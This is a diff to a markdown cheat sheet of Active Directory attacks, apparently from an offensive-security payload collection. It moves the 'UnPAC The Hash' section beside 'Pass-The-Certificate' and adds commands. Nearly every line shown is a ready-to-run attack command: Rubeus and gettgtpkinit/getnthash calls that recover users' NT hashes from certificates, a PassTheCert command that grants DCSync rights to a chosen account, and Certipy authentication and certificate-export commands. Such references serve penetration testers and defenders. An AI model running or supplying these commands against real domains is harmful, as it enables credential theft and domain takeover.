@@ -62,7 +62,6 @@
     - [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
       - [Using impacket](#using-impacket)
       - [Using Rubeus](#using-rubeus)
-    - [UnPAC The Hash](#unpac-the-hash)
     - [Capturing and cracking Net-NTLMv1/NTLMv1 hashes](#capturing-and-cracking-net-ntlmv1ntlmv1-hashes)
     - [Capturing and cracking Net-NTLMv2/NTLMv2 hashes](#capturing-and-cracking-net-ntlmv2ntlmv2-hashes)
     - [Man-in-the-Middle attacks & relaying](#man-in-the-middle-attacks--relaying)
@@ -84,6 +83,7 @@
       - [ESC8 - AD CS Relay Attack](#esc8---ad-cs-relay-attack)
       - [Certifried CVE-2022-26923](#certifried-cve-2022-26923)
       - [Pass-The-Certificate](#pass-the-certificate)
+    - [UnPAC The Hash](#unpac-the-hash)
     - [Shadow Credentials](#shadow-credentials)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
     - [Abusing DNS Admins Group](#abusing-dns-admins-group)
@@ -1915,21 +1915,6 @@ root@kali:~$ klist
 .\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
 ```
 
-### UnPAC The Hash
-
-* Windows
-    ```ps1
-    # request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.
-    C:/> Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
-    ```
-* Linux
-    ```ps1
-    # obtain a TGT by validating a PKINIT pre-authentication
-    $ gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
-    
-    # use the session key to recover the NT hash
-    $ export KRB5CCNAME="TGT_CCACHE_FILE" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
-    ```
 
 ### Capturing and cracking Net-NTLMv1/NTLMv1 hashes
 
@@ -2516,6 +2501,8 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
 
 #### Pass-The-Certificate
 
+> Pass the Certificate in order to get a TGT, this technique is used in "UnPAC the Hash" and "Shadow Credential"
+
 * Windows
   ```ps1
   # Information about a cert file
@@ -2523,6 +2510,11 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
 
   # From a Base64 PFX
   Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
+
+  # Grant DCSync rights to an user
+  ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --sid <user_SID>
+  # To restore
+  ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --restore restoration_file.txt
   ```
 * Linux
   ```ps1
@@ -2534,7 +2526,29 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
 
   # PFX certificate (file) + password (string, optionnal)
   gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
+
+  # Using Certipy
+  certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
+  certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
   ```
+
+### UnPAC The Hash
+
+Using the **UnPAC The Hash** method, you can retrieve the NT Hash for an User via its certificate.
+
+* Windows
+    ```ps1
+    # Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.
+    Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
+    ```
+* Linux
+    ```ps1
+    # Obtain a TGT by validating a PKINIT pre-authentication
+    $ gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
+    
+    # Use the session key to recover the NT hash
+    $ export KRB5CCNAME="TGT_CCACHE_FILE" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
+    ```
 
 
 ### Shadow Credentials
